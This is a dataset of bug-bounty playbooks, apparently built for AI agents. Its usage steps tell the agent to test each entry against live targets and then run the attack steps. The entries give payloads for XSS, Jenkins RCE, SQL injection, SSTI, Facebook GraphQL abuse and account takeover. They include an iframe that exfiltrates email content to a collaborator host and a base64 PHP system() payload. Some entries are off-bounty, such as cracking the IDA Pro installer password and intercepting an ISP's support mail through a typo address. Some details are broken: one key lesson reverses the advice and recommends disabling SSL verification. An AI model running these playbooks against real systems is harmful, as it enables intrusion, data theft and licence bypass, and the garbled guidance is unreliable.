description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: XSS on Google Custom Search Engine

trigger_conditions.when_to_apply: When a user has created a Google Custom Search Engine and can configure promotion URLs.
prerequisites: Attacker must be able to create or have access to a Google Custom Search Engine.
applicability_signals: The ability to add promotion URLs to a CSE.
The CSE displays promotions for triggering keywords.
skip_if: If the promotion URL field filters out JavaScript payloads.

recon_steps: Navigate to https://cse.google.com/ to understand the interface for creating and managing custom search engines.
Create a custom search engine and observe the available options, particularly for promotions.
attack_steps: Step 1: Create a Google Custom Search Engine.
Step 2: Navigate to the promotion settings for the CSE.
Step 3: Add a promotion URL, setting the triggering keyword and the URL to `javascript:alert(0)`.
Step 4: Visit the CSE URL with a query that matches the triggering keyword to see if the promotion URL is triggered. Example: `https://cse.google.com/cse?cx=<YOUR_ID>&q=triggeringkeyword`
Step 5: If the promotion URL is clicked by a victim (or the attacker for testing), the XSS payload should execute.
tools_recommended: Browser for manual testing
Burp Suite (for potentially automating enumeration of CSE IDs or observing traffic)
success_indicators: An alert box with '0' pops up in the browser after clicking the promotion URL.
The payload `javascript:alert(0)` is executed when navigating to `https://cse.google.com/cse?cx=<YOUR_ID>&q=triggeringkeyword` and clicking the promotion.
failure_indicators: The `javascript:alert(0)` payload is filtered or sanitized by the promotion URL input field.
The promotion URL is not displayed or not clickable when the triggering keyword is searched.

playbooks.impact: Execution of arbitrary JavaScript in the victim's browser within the context of the Google Custom Search Engine page, potentially leading to session hijacking, defacement, or further phishing attacks if the promotion URL is manipulated.
playbooks.key_lesson: When adding user-controlled input for URLs, especially in promotional or advertisement features, always test for JavaScript execution by attempting to inject `javascript:` URIs.

meta.title: Story of my Biggest Bounty ever : Command Execution on Jenkins

trigger_conditions.when_to_apply: When a publicly accessible Jenkins instance is discovered and an authenticated user can access the 'Manage Jenkins' section.
prerequisites: Access to a Jenkins instance
Ability to register as a user on the Jenkins instance
applicability_signals: Publicly available sign-up functionality on Jenkins
'Manage Jenkins' option is available to authenticated users
Installation of plugins is permitted
skip_if: Jenkins instance is not publicly accessible
User registration is disabled
Plugin installation is disabled
'/script' console is completely locked down with no other administrative options available

recon_steps: Step 1: Use a script to discover Jenkins instances (e.g., by scanning for common Jenkins ports or URLs).
Step 2: Browse the discovered Jenkins IP addresses to identify publicly accessible instances with sign-up functionality.
Step 3: Register an account on the Jenkins instance to gain authenticated access.
attack_steps: Step 1: Attempt to execute commands via the '/script' console (e.g., `echo hello`).
Step 2: If direct command execution in '/script' fails, navigate to 'Manage Jenkins'.
Step 3: Install the 'Terminal' plugin from the 'Manage Plugins' section.
Step 4: Access the terminal provided by the 'Terminal' plugin and execute OS commands.
tools_recommended: Custom script for Jenkins discovery
Web browser for interacting with Jenkins UI
success_indicators: Successful execution of OS commands via the 'Terminal' plugin, confirming RCE.
Output of commands like `whoami` or `id` is visible.
failure_indicators: Inability to register an account.
Access to 'Manage Jenkins' is restricted.
Plugin installation is disabled.
Errors or lack of output when attempting to execute commands.
If all steps fail, consider other Jenkins vulnerabilities or pivot to different targets if scope allows.

playbooks.impact: Attacker can execute arbitrary operating system commands on the Jenkins server, leading to full compromise of the Jenkins instance and potentially other systems accessible from it.
playbooks.key_lesson: When a Jenkins instance is found, check for exposed administrative features like plugin management that can lead to RCE, even if direct script console access is restricted.

meta.title: Blind (time-based) SQLi

trigger_conditions.when_to_apply: When a file upload functionality accepts user-controlled filenames and the filename is included in a database query without proper sanitization, and a WAF is present that needs bypassing.
prerequisites: Attacker has a self-registered user account.
Target application is protected by Cloudflare WAF.
A known Cloudflare WAF bypass technique is available and applicable.
applicability_signals: File upload endpoint exists.
Application validates file extensions (e.g., requires '.pdf').
Filename parameter is observable in HTTP requests.
Application logs or processes filenames in a database.
skip_if: File upload is not present or does not accept user-controlled filenames.
No WAF bypass is known or applicable.
All payloads are blocked by the WAF without a bypass.

recon_steps: Step 1: Register a new user account to gain authenticated access.
Step 2: Navigate to the file upload functionality and attempt to upload a file to identify the relevant HTTP request and parameters.
Step 3: Observe the application's file extension validation by attempting to upload files with and without valid extensions (e.g., '.pdf').
Step 4: Identify if the application is protected by Cloudflare WAF by sending test payloads and observing 'Access Denied' responses.
attack_steps: Step 1: Intercept the file upload request using a proxy (e.g., Burp Suite).
Step 2: Modify the filename parameter to include a time-based SQLi payload, ensuring the original file extension (e.g., '.pdf') is retained to bypass initial validation.
Step 3: Apply the identified Cloudflare WAF bypass technique to the request.
Step 4: Send the modified request and observe the response time.
Step 5: Incrementally increase the sleep duration in the payload for subsequent requests to confirm time-based delays.
Step 6: Analyze response times to determine if the application is vulnerable. A significant delay indicates successful SQL injection.
tools_recommended: Burp Suite: Proxy to intercept and modify requests, Repeater to send individual requests and observe responses.
Custom script: To automate sending multiple requests with varying sleep times and analyzing response times.
success_indicators: Response times are significantly longer than normal requests, corresponding to the `SLEEP()` duration specified in the payload. For example, a request with `SLEEP(5)` should take approximately 5 seconds longer than a normal request.
failure_indicators: Requests consistently return 'Access Denied' or other WAF-related error codes, even with the bypass technique applied. Pivot to investigating alternative WAF bypasses or different vulnerability classes.

Response times do not increase proportionally with the `SLEEP()` duration, indicating the payload is not being injected into the SQL query or the database is not affected by the delay function. Try alternative SQLi syntax or different time-based functions (e.g., `pg_sleep()` for PostgreSQL).

Application returns generic error messages (e.g., 500 Internal Server Error) without obvious delays. This could indicate a syntax error in the payload or a different injection point. Try enumerating parameters and injection syntax.

playbooks.impact: Information disclosure of sensitive data stored in the database, by being able to exfiltrate data through time-based responses. In this private program context, extracting PII would create new issues.
playbooks.key_lesson: When file uploads are present and filenames are used in backend queries, test for time-based SQL injection by manipulating the filename parameter, especially if WAF bypass techniques are known for the target.

meta.title: Finding hidden gems vol. 4: Rakefile a.k.a. how to get AWS keys again

target_profile.technology: Ruby on Rails (inferred from Rakefile and Ruby syntax)
tech_stack_fingerprints: presence of Rakefile in web root

trigger_conditions.when_to_apply: When a web application is built using Ruby and might expose build or deployment related files in its web root.
prerequisites: Target application uses Ruby/Rake for build or deployment.
applicability_signals: Existence of a 'Rakefile' in the application's web root.
Rakefile contains paths to sensitive configuration files like 'deployment.yml'.
skip_if: No Rakefile is found.
WAF blocks requests to common configuration file names.
Application is not built with Ruby.

recon_steps: Step 1: Scan the web root of the target application for a file named 'Rakefile'.
Step 2: If 'Rakefile' is found, analyze its content for references to configuration files (e.g., 'deployment.yml', '*.yaml', '*.json').
attack_steps: Step 1: Construct a URL to the identified configuration file (e.g., <TARGET_URL>/conf/deployment.yml).
Step 2: Send an HTTP GET request to the constructed URL.
Step 3: Analyze the response for sensitive information.
tools_recommended: DirBuster/Gobuster for directory and file brute-forcing.
Burp Suite for intercepting and analyzing HTTP requests/responses.
success_indicators: HTTP 200 OK response with sensitive credentials (e.g., AWS keys) in the response body.
HTTP 200 OK response containing configuration details that could lead to further exploitation.
failure_indicators: 404 Not Found for Rakefile or configuration file → Check for alternative file names or common deployment file locations.
403 Forbidden for configuration file → The file is protected, but the Rakefile existence is a good indicator of potential misconfigurations.

playbooks.impact: Disclosure of sensitive credentials, such as AWS access keys, allowing an attacker to gain unauthorized access to cloud resources and potentially compromise the entire infrastructure.
playbooks.key_lesson: Always check for build/deployment related files like Rakefile, Makefile, Dockerfile in the web root as they may contain sensitive configuration details or credentials.

meta.title: Injecting {{6*200}} to $1200

tech_stack_fingerprints: Jinja2 engine detection via {{7*'7'}} payload yielding 7777777

trigger_conditions.when_to_apply: When user input, specifically a username, is rendered unsanitized within an email template, and the backend application utilizes a template engine like Jinja2.
prerequisites: Attacker can register a username.
Attacker can use the 'forgot password' functionality.
The application sends emails for password resets.
applicability_signals: Username field accepts arbitrary strings.
Usernames are displayed in password reset emails.
When a specific payload like {{7*7}} is used as a username, it gets evaluated as a number (e.g., 49) in the email when the email address is also provided in the username field.
skip_if: Input validation sanitizes all template syntax.
The template engine does not evaluate user-controlled input.
All template evaluations result in errors or escape characters instead of execution.

recon_steps: Step 1: Register a new user with a simple mathematical expression as the username (e.g., {{7*7}}).
Step 2: Initiate the 'forgot password' flow and observe the content of the password reset email. Note if the username is rendered as plain text or evaluated.
attack_steps: Step 1: During the 'forgot password' flow, enter a target user's email address in BOTH the 'username' and 'email address' fields.
Step 2: Observe the password reset email. If the username field is evaluated as a template expression, attempt to identify the template engine.
Step 3: Use a payload like {{7*'7'}} in the username field and check the email output. If it results in '7777777', Jinja2 is confirmed.
Step 4: Consult a SSTI payload repository (e.g., PayloadsAllTheThings) for Jinja2 RCE payloads.
Step 5: Craft and inject a Jinja2 RCE payload into the username field during registration. Then trigger the 'forgot password' flow using the target's email in both fields.
tools_recommended: Burp Suite: To intercept and modify requests, observe responses, and automate payload testing.
PayloadsAllTheThings (GitHub): For a comprehensive list of SSTI payloads for various template engines.
success_indicators: The password reset email contains the output of an executed system command (e.g., 'uid=... gid=... groups=...' from the 'id' command).
The application performs an action based on the executed command, indicating RCE.
failure_indicators: The username is rendered literally in the email (e.g., '{{7*7}}' remains as is) → The application might be sanitizing input or not rendering it in the email template. Try to find other input points.
The template engine is different (e.g., {{7*7}} results in 49, but {{7*'7'}} does not result in 7777777) → Adapt payloads to the identified template engine.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing the attacker to execute arbitrary commands with the privileges of the web server process.
playbooks.key_lesson: Always test user-controlled input points for Server-Side Template Injection (SSTI) by submitting mathematical expressions and observing their evaluation in rendered outputs, especially in dynamic content like emails.

meta.title: Another Download Protection Bypass in Google Chrome – BIN files in Mac OS

affected_components: Download protection mechanism for .bin files on macOS
tech_stack_fingerprints: Download of executable or script-like files being intercepted

trigger_conditions.when_to_apply: This technique is applicable when targeting users on macOS who download files using Google Chrome, and the browser's download protection mechanism incorrectly trusts the .bin file extension.
prerequisites: Target is using Google Chrome on macOS.
The specific version of Chrome is vulnerable to the .bin file bypass (pre-March 2019 patch).
applicability_signals: Observing Chrome's default handling of .bin files on macOS involves Archive Mounter.
The .bin file extension is present in Chrome's internal whitelist for safe file types.
skip_if: Target is not using macOS.
Target is using a patched version of Google Chrome (post-March 2019).
The .bin file extension is no longer whitelisted by Chrome.

recon_steps: Step 1: Confirm the target is using macOS and Google Chrome by analyzing User-Agent strings if possible, or by observing their browsing habits.

Step 2: Attempt to download a benign .bin file (e.g., a renamed zip archive) and observe Chrome's behavior. If it prompts for Archive Mounter and does not flag it as unsafe, the vulnerability might be present.
attack_steps: Step 1: Craft a malicious payload and archive it (e.g., using zip).
Step 2: Rename the archived file to have a .bin extension (e.g., malicious.zip -> malicious.bin).
Step 3: Host the malicious.bin file on a web server accessible to the target.
Step 4: Trick the target into downloading the malicious.bin file via Google Chrome on macOS.
payloads_or_patterns: A file disguised as a .bin extension that, when opened by Archive Mounter on macOS, executes malicious code or performs an unwanted action. Example: A ZIP file containing a macOS executable disguised as a document.
tools_recommended: Web server for hosting the malicious .bin file.
Archiving tool (e.g., zip, rar) to create the payload.
macOS system to test the crafted .bin file before delivery.
success_indicators: The target downloads the .bin file without Chrome's download protection triggering.
The .bin file is automatically opened by Archive Mounter on the target's macOS.
Malicious code within the file is executed or an unintended action occurs.
failure_indicators: Google Chrome flags the .bin file as unsafe or blocks the download.
The .bin file is not automatically handled by Archive Mounter.
No malicious code execution or unintended action occurs.

playbooks.impact: Allows an attacker to bypass Chrome's download protection on macOS, potentially leading to the execution of arbitrary code, installation of malware, or unauthorized data access by tricking the user into downloading and opening a seemingly safe file.
playbooks.key_lesson: When targeting browser download protection, always consider platform-specific file handling mechanisms and whitelisting of file extensions, especially for less common or re-purposed extensions.

meta.title: View Facebook payouts for any Facebook Trivia Game

affected_components: GraphQL API endpoint for trivia game payouts

trigger_conditions.when_to_apply: When a Facebook trivia game feature is active and its GraphQL API can be queried to retrieve payout information for winners.
prerequisites: Authenticated Facebook user session
applicability_signals: Presence of a Facebook trivia game
Ability to query the GraphQL API with a game ID or relevant video ID
skip_if: Facebook Trivia Games are not available or disabled in the target region
GraphQL API is rate-limited or blocks queries related to game payouts

recon_steps: Step 1: Identify active Facebook Trivia Games by browsing Facebook or using search terms.
Step 2: Observe network requests made by the Facebook Trivia Game interface to identify the GraphQL endpoint and query parameters.
attack_steps: Step 1: Construct a GraphQL query to fetch payout details for a specific trivia game. The query should target `trivia_game_payouts` and include fields like `user{id,name}` and `payout{formatted_amount}`.
Step 2: Execute the crafted GraphQL query against the Facebook GraphQL API endpoint, using your authenticated session.
Step 3: Analyze the response for sensitive payout information, including user names, IDs, and formatted payout amounts for winners of the trivia game.
tools_recommended: Browser Developer Tools (Network tab) to observe requests and responses
Burp Suite or OWASP ZAP to intercept and modify GraphQL requests
success_indicators: Response contains a list of users with their names and payout amounts for a trivia game, even if the attacker did not participate or win.
Ability to retrieve payout information for multiple different trivia games.
failure_indicators: GraphQL query returns an error indicating invalid parameters or insufficient permissions (e.g., 400 Bad Request, 403 Forbidden). Suggest trying different game IDs or exploring other GraphQL mutations.
Response contains no payout information or limited user data (e.g., only winner count). Suggest checking if the game has payouts enabled or if the query is malformed.

playbooks.impact: Allows an attacker to view the full winner list and associated payout information for any Facebook Trivia Game, potentially leading to the discovery of cheating behaviors, financial analysis of game payouts, or identification of high-value players.
playbooks.key_lesson: Always inspect GraphQL queries for sensitive data exposure, especially when dealing with game or financial features, as they may reveal more information than intended.

meta.title: Toggle Group Rules Agreement as a non-member

trigger_conditions.when_to_apply: When a user can interact with group settings via the Facebook Graph API without being a member or administrator of the group.
prerequisites: Attacker has a Facebook account (to obtain actor_id, though the writeup implies it might be obtainable without authenticated session)
Attacker can identify a target group_id
applicability_signals: The presence of the /api/graphql/ endpoint
The ability to construct valid `variables` and `doc_id` parameters for the GraphQL API
skip_if: All GraphQL API calls are blocked or require specific administrative session tokens.
The `actor_id` parameter is strictly validated against the authenticated user's session.

recon_steps: Step 1: Identify a target Facebook group and its `group_id`.
Step 2: Navigate to the target group's membership questions page (if accessible as a non-member) to observe the UI state, or rely on programmatic discovery.
Step 3: Attempt to identify common `doc_id` values used for group administration actions through network traffic analysis or known exploits.
attack_steps: Step 1: Using browser developer tools or an interception proxy, send a POST request to `/api/graphql/` with the following parameters:
- `fb_api_caller_class`: 'RelayModern'
- `variables`: '{input:{client_mutation_id:1,,actor_id:"<ATTACKER_ACTOR_ID>",group_id:"<TARGET_GROUP_ID>"}}'
Step 2: Observe the response. If `"is_rules_agreement_enabled": true` is returned, the rule agreement has been enabled.
Step 3: To disable, send another POST request to `/api/graphql/` with:
- `doc_id`: '1977893365666925' (for disabling)
- `fb_api_caller_class`: 'RelayModern'
- `variables`: '{input:{client_mutation_id:1,actor_id:"<ATTACKER_ACTOR_ID>",group_id:"<TARGET_GROUP_ID>"}}'
Step 4: Verify the change by logging in as an administrator for the target group and checking the membership questions page.
payloads_or_patterns:
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/x-www-form-urlencoded

doc_id=2605976872810818&fb_api_caller_class=RelayModern&variables=%7Binput%3A%7Bclient_mutation_id%3A1%2C%2Cactor_id%3A%22<ATTACKER_ACTOR_ID>%22%2Cgroup_id%3A%22<TARGET_GROUP_ID>%22%7D%7D

POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/x-www-form-urlencoded

doc_id=1977893365666925&fb_api_caller_class=RelayModern&variables=%7Binput%3A%7Bclient_mutation_id%3A1%2Cactor_id%3A%22<ATTACKER_ACTOR_ID>%22%2Cgroup_id%3A%22<TARGET_GROUP_ID>%22%7D%7D
tools_recommended: Burp Suite: Intercept and modify POST requests to `/api/graphql/`
Browser Developer Tools: For sending `AsyncRequest` from the console
success_indicators: Response JSON containing `"is_rules_agreement_enabled": true` for the enable call.
Response JSON containing `"is_rules_agreement_enabled": false` for the disable call.
Verification by an administrator on the group's membership questions page confirming the toggle state has changed.
failure_indicators: Receiving a 403 Forbidden or similar error code, indicating authentication or authorization failure.
Receiving a response indicating the `actor_id` is invalid or not permitted to perform the action.
The `is_rules_agreement_enabled` field remains unchanged in the response or after admin verification.

playbooks.impact: An unauthenticated user can enable or disable the 'agree to rules' setting for any Facebook group, bypassing administrative controls.
playbooks.key_lesson: Always validate that API requests to modify settings are authorized for the authenticated user's role and context, especially when dealing with sensitive features like group administration.

meta.title: Download .arexport files for any public AR Studio Effect

trigger_conditions.when_to_apply: When there are public AR Studio Effects that the attacker does not own, and the Graph API allows fetching revisions for effects using their IDs.
prerequisites: The attacker must be able to identify the owner ID of an AR Studio Effect.
The target AR Studio Effect must be public.
applicability_signals: The presence of a /graphql endpoint on graph.facebook.com.
The ability to query for effects belonging to a specific owner ID using the `ar_hub_effects_query`.
The ability to query for revisions of an effect using its `EFFECT_ID`.
skip_if: The Graph API returns 401 or 403 for queries related to AR Studio Effects without authentication.
The `ar_hub_effects_query` does not return any effects for public owner IDs.

recon_steps: Step 1: Use the Graph API to list public AR Studio Effects for various owner IDs. Observe the structure of the response to identify potential `ownerID` values and `EFFECT_ID`s.

Step 2: Once a public `EFFECT_ID` is identified, attempt to query its revisions using the provided GraphQL query pattern. Confirm that the `revisions.uri` field contains a downloadable `.arexport` file.
attack_steps: Step 1: Send a POST request to `https://graph.facebook.com/graphql` with the `access_token` and `doc_id` for listing effects, and iterate through potential `ownerID` values to find public effects. Example: `POST /graphql?access_token=<ACCESS_TOKEN> HTTP/1.1 Host: graph.facebook.com doc_id=1201966106594165 variables ={ownerID:<OWNER_ID>}`

Step 2: For each discovered `EFFECT_ID` from a public effect, send a GET request to the GraphQL endpoint to fetch its revisions. Example: `GET /graphql?q=node(<EFFECT_ID>){ar_studio_effect{revisions{uri,id,version,instances{id,name,size}}}}`
Step 3: Extract the `uri` from the response, which points to the downloadable `.arexport` file. Download the file using a standard HTTP client.
payloads_or_patterns:
POST /graphql?access_token=<ACCESS_TOKEN> HTTP/1.1
Host: graph.facebook.com
doc_id=1201966106594165

variables ={"ownerID":<OWNER_ID>}
tools_recommended: Burp Suite: To intercept and modify Graph API requests, and to observe responses.
curl: To automate the downloading of `.arexport` files once the `uri` is discovered.
success_indicators: Receiving a 200 OK response for the revision query with a valid `uri` pointing to a `.arexport` file.
Successfully downloading a `.arexport` file that contains assets and original effects for a public AR Studio Effect, even if the attacker does not own the effect or the owner ID used.
failure_indicators: Receiving 401 Unauthorized or 403 Forbidden for Graph API requests, indicating authentication or authorization issues.
Responses without a `revisions` field or an empty `revisions` array for a given `EFFECT_ID`.
The `uri` pointing to a non-existent file or an error page.

playbooks.impact: An attacker can download the source files (.arexport) for any public AR Studio Effect, potentially gaining access to proprietary assets, design choices, and implementation details of AR effects created by other users.
playbooks.key_lesson: When dealing with APIs that expose resources based on IDs, test for the ability to access resources belonging to other users by iterating through or guessing IDs, especially if the resource can be made public.

meta.title: Password Reset Vulnerability — Full Account takeover (Insecure Direct Object Reference)

trigger_conditions.when_to_apply: When the password reset functionality allows the attacker to provide the victim's username and email address, and the application fails to validate that the logged-in user initiating the reset is the same as the provided user details.
prerequisites: Attacker has an authenticated session.
Attacker knows the victim's username and email address.
applicability_signals: Password reset flow takes username, email, and security questions.
No password reset token is used; password reset happens on the same page.
HTTP request for password reset contains fields for username, email, and security questions.
skip_if: Password reset flow requires a token sent to the user's email.
The application validates that the user performing the reset is the account owner.
Security questions are not used or are validated against the authenticated user's session.

recon_steps: Step 1: Identify the password reset functionality.
Step 2: Observe the parameters submitted during the password reset process using a proxy (e.g., Burp Suite). Look for parameters like 'username', 'email', 'security_question_1', 'answer_1', etc.
attack_steps: Step 1: Create two accounts: attacker's account (e.g., attacker@example.com) and victim's account (e.g., victim@example.com).
Step 2: Log in with the attacker's account.
Step 3: Navigate to the 'Forgot Password' or 'Reset Password' panel.
Step 4: Enter the attacker's username and email address and proceed to the next step (e.g., security questions).
Step 5: Intercept the HTTP request for the security questions or the final password reset submission.
Step 6: Modify the 'email' and 'username' parameters in the intercepted request to use the victim's email address and username.
Step 7: Forward the modified request.
Step 8: If successful, the password reset confirmation should be sent to the victim's email, and the password should be reset for the victim's account.
tools_recommended: Burp Suite (or similar proxy): To intercept and modify HTTP requests.
success_indicators: Email received at the victim's email address confirming the password reset.
Ability to log in to the victim's account using the newly set password.
failure_indicators: Request rejected with an error indicating that the provided details do not match the logged-in user.
Password reset email sent to the attacker's email address instead of the victim's.
No password reset email received.

playbooks.impact: Full account takeover of the victim's account, allowing the attacker to access sensitive information, perform actions on behalf of the victim, and potentially cause further damage.
playbooks.key_lesson: When handling password resets, always validate that the user initiating the reset is the owner of the account whose password is being reset, especially when user identifiers like email and username are submitted as parameters.

meta.title: Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way

trigger_conditions.when_to_apply: When an IDA Pro installer is available, and the installation password is required.
prerequisites: Access to an IDA Pro installer (Linux/macOS or Windows version).
applicability_signals: Installer prompts for an installation password.
skip_if: The installer does not require a password, or the password generation mechanism is cryptographically secure and not based on predictable PRNG.

recon_steps: Step 1: Obtain the IDA Pro installer file for Linux/macOS or Windows.
Step 2: Analyze the installer's build tool. For Linux/macOS, identify it as InstallBuilder. For Windows, identify it as Inno Setup.
attack_steps: Step 1 (Linux/macOS): Run the installer and use a debugger or memory analysis tool to inspect the process memory and extract the plaintext installation password.

Step 2 (Windows): Analyze the Inno Setup installer to understand the password generation logic. This may involve reverse engineering the installer's code to identify the PRNG algorithm and its seed generation. Attempt to recreate the PRNG with known parameters or by observing its output during installation to predict the password.
Step 3 (Windows): If the PRNG can be identified and seeded, generate the correct installation password.
Step 4: Use the obtained or generated password to complete the IDA Pro installation.
payloads_or_patterns: For Linux/macOS: Memory dump or debugger output showing the plaintext password.
For Windows: Exploited PRNG algorithm and logic to generate the password.
tools_recommended: Debugger (e.g., GDB for Linux/macOS, WinDbg for Windows)
Memory analysis tools (e.g., Volatility for Linux/macOS, Process Explorer for Windows)
Reverse engineering tools (e.g., Ghidra, IDA Pro's disassembler for Windows installer analysis)
success_indicators: Successful installation of IDA Pro without the official installation password.
For Linux/macOS: Plaintext password found in memory.
For Windows: Generated password successfully unlocks the installer.
failure_indicators: For Linux/macOS: Password not found in memory after thorough analysis; Investigate other potential obfuscation or encryption methods.

For Windows: Inability to identify or replicate the PRNG; Consider if the installer logic has changed or if it relies on external factors. If brute-force is attempted and fails, it indicates a strong password or a large keyspace, thus pivot to PRNG analysis.

playbooks.impact: Ability to install IDA Pro without a valid, purchased installation password, potentially bypassing licensing controls.
playbooks.key_lesson: Analyze installers and thick clients for predictable pseudo-random number generators (PRNGs) and weak seeding mechanisms, as these can lead to bypassing installation password requirements or other security controls.

meta.title: How I Hacked the Microsoft Outlook Android App and Found CVE-2019-1105

affected_components: Email client handling of iframes with javascript: URIs

trigger_conditions.when_to_apply: When an email client, like the Outlook Android app, incorrectly renders HTML/JavaScript content within emails, allowing `javascript:` URIs in iframes to execute with elevated privileges.
prerequisites: Attacker can send emails to the target user.
applicability_signals: Email client fails to properly sanitize or block `javascript:` URIs within `<iframe>` tags.
Email client renders HTML content directly without sufficient sanitization.
Email client doesn't properly restrict JavaScript execution context within iframes loaded from mail content.
skip_if: Email client strictly enforces CSP or equivalent that prevents `javascript:` URIs.
Email client does not allow iframes or renders them in a sandboxed environment that prevents script execution.

recon_steps: Step 1: Send a test email containing an `<iframe>` with a `src` attribute set to a `javascript:` URI pointing to an external script that logs information or performs a callback.
Step 2: Observe if the script executes within the Outlook Android app and if any data is exfiltrated or a callback is received.
attack_steps: Step 1: Craft an HTML email containing an `<iframe>` tag. Set the `src` attribute to a `javascript:` URI.

Step 2: Within the `javascript:` URI, construct JavaScript code that accesses sensitive information (e.g., cookies, tokens, email content) and exfiltrates it to an attacker-controlled server or a dedicated listener (e.g., Burp Collaborator).
Step 3: Send the crafted email to the target's Outlook Android app.
Step 4: Upon the target opening and reading the email, the JavaScript code within the iframe should execute.
Step 5: Monitor the attacker-controlled server or listener for incoming data, confirming successful XSS execution and data exfiltration.
payloads_or_patterns: <iframe src="javascript: var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://<BURP_COLLABORATOR_HOST>/' + encodeURIComponent(document.body.innerText)); xhr.send();"></iframe>
tools_recommended: Burp Suite: For setting up a Collaborator listener to receive exfiltrated data and for crafting the HTTP requests for the attacker-controlled server.
Custom script: To generate the HTML email content with the malicious iframe.
success_indicators: The `alert(document.cookie)` payload pops up a JavaScript alert box with the user's cookies.
A callback is received at the attacker-controlled server or Burp Collaborator containing exfiltrated data from the email or the application's context.
The email client executes arbitrary JavaScript code as a result of opening the email.
failure_indicators: No `alert` box appears, and no callback is received, indicating the `javascript:` URI is not executed or is blocked.
The `<iframe>` content is rendered as plain text or an error message.

playbooks.impact: An attacker can execute arbitrary JavaScript within the context of the Outlook Android app, leading to the theft of sensitive user data such as cookies, authentication tokens, and potentially parts of the user's inbox. This could lead to account takeover or further malicious actions.
playbooks.key_lesson: Always test email rendering engines for the ability to execute `javascript:` URIs within iframes, as these can bypass sanitization and execute with elevated privileges within the application's context.

meta.title: Catching support emails from my internet service provider

trigger_conditions.when_to_apply: When a customer support email address registration system allows for common typos or variations of a valid address, and the system has not been properly blacklisted.
prerequisites: Ability to register an email address that is a common misspelling of a legitimate customer support address.
The ISP or service provider uses the mispelled address to receive customer inquiries.
applicability_signals: Observing common language spelling variations or known typos for support email addresses.
The target system allows registration of seemingly valid but slightly misspelled email addresses.
skip_if: The target system has a robust email address validation that rejects common misspellings.
The target system does not rely on direct email delivery for customer support inquiries.

recon_steps: Step 1: Identify common Dutch language spelling variations or known typos for customer support email addresses (e.g., 'klanteservice' vs. 'klantenservice', 'suport' vs. 'support').
Step 2: Attempt to register these variations as valid email addresses with the target ISP or service provider.
attack_steps: Step 1: Identify a target ISP or service provider that handles customer support via email.
Step 2: Attempt to register a misspelled version of their official support email address (e.g., 'klanteservice@isp.nl' instead of 'klantenservice@isp.nl').
Step 3: If registration is successful, wait for customer support inquiries to be sent to the misspelled address.
Step 4: Monitor the misspelled inbox for sensitive data or customer information being sent by unaware customers.
tools_recommended: Browser for registration
Email client or service to monitor the captured emails
success_indicators: Receiving emails with sensitive customer data, account information, or support requests in the registered misspelled email address.
failure_indicators: Registration of the misspelled email address is rejected by the system (e.g., 'email address already exists' or 'invalid email format').
No customer support emails are received at the misspelled address after a reasonable waiting period.

playbooks.impact: Attacker can intercept sensitive customer support emails containing personal data, account details, and potentially sensitive information related to customer issues with the ISP.
playbooks.key_lesson: Verify email address blacklists for common misspellings and typos, especially for critical support or administrative email addresses.

meta.title: About a Sucuri RCE...and How Not to Handle Bug Bounty Reports

trigger_conditions.when_to_apply: When a target provides a PHP script for server-side scanning that utilizes cURL for outbound communication and has SSL certificate verification disabled.
prerequisites: Attacker must be able to perform a Man-in-the-Middle (MITM) attack on the communication between the target's server and Sucuri's monitoring system.
The target must be using the Sucuri server-side scanner with SSL certificate verification disabled.
applicability_signals: Existence of a PHP script with a filename like 'sucuri-[md5].php' that accepts POST requests with a 'secret' parameter and a 'run' GET parameter.
Analysis of the PHP script reveals `curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);`.
skip_if: The Sucuri server-side scanner script enforces strict IP validation that cannot be bypassed.
SSL certificate verification is enabled (`CURLOPT_SSL_VERIFYPEER` is set to `true`).

recon_steps: Step 1: Obtain the Sucuri server-side scanner PHP script by registering a Sucuri account and downloading the script from their website.
Step 2: Analyze the PHP script for the presence of the `curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);` line and the logic for constructing and executing the cURL request.
attack_steps: Step 1: Set up a MITM proxy (e.g., Burp Suite) to intercept traffic between the customer's server running the Sucuri scanner and Sucuri's monitoring endpoint (`monitor2.sucuri.net/imonitor`).

Step 2: Trigger the Sucuri scanner script on the customer's server by sending a POST request to the script's URL with a valid 'secret' parameter (obtainable from Sucuri's communication or by observing legitimate requests).
Step 3: Intercept the outbound cURL request from the customer's server to `monitor2.sucuri.net/imonitor`.
Step 4: Modify the response from `monitor2.sucuri.net/imonitor` to contain a crafted base64 encoded PHP payload that the `eval()` function in the script will execute.
Step 5: The PHP code on the customer's server will receive the modified response, decode it, and execute the attacker-controlled PHP code on the customer's server.
payloads_or_patterns: PHP payload for arbitrary code execution, e.g., `c3lzdGVtKCJ0b3VjaCAvdG1wL3JjZSIpOw==` (which decodes to `system("touch /tmp/rce");`)
tools_recommended: Burp Suite: For MITM interception and response modification.
PHP: To craft the base64 encoded payloads.
success_indicators: Successful execution of arbitrary commands on the customer's server, e.g., a file creation (`touch /tmp/rce`) or a reverse shell connection.
The response from the Sucuri monitoring system to the modified cURL request will contain the attacker's decoded PHP code, which is then executed.
failure_indicators: The server-side scanner script does not contain `CURLOPT_SSL_VERIFYPEER, false`. The vulnerability is not present.
The target server's network configuration or firewall blocks the outbound cURL request to Sucuri's monitoring endpoint.
Sucuri implements stricter IP validation that prevents the initial POST request from being processed, or the MITM modification is detected.
If the script exits early due to missing 'run' or 'secret' parameters before the cURL call is made.

playbooks.impact: Remote Code Execution (RCE) on customer servers running the Sucuri server-side scanner, allowing an attacker to execute arbitrary commands with the privileges of the web server process.
playbooks.key_lesson: Always disable SSL certificate verification in cURL options when communicating with external services if you want to allow arbitrary code execution via Man-in-the-Middle attacks.

meta.title: How a classical XSS can lead to persistent ATO Vulnerability?

